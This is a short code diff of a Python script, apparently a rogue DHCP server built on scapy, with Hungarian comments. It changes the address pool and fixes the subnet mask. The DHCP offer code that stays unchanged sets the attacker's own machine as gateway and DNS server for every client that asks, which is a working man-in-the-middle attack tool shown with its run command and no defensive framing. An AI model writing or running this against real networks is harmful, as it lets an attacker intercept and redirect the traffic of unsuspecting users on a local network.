@@ -7,8 +7,8 @@ Futtatás: sudo python rogue_dhcp.py eth0
 import sys
 from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff, conf
 
-ROGUE_IP = "10.10.10.254"
-POOL = [f"10.10.10.{i}" for i in range(100, 200)]
+ROGUE_IP = "172.16.10.254"
+POOL = [f"172.16.10.{i}" for i in range(100, 200)]
 assigned = {}
 
 def handle_discover(pkt):
@@ -23,7 +23,7 @@ def handle_discover(pkt):
                 BOOTP(op=2, yiaddr=offer_ip, siaddr=ROGUE_IP,
                       chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
                 DHCP(options=[("message-type", 2), ("server_id", ROGUE_IP),
-                              ("subnet_mask", "255.0.0.0"),
+                              ("subnet_mask", "255.255.255.0"),
                               ("router", ROGUE_IP),          # <-- mi vagyunk a GW
                               ("name_server", ROGUE_IP),
                               ("lease_time", 3600), "end"]))
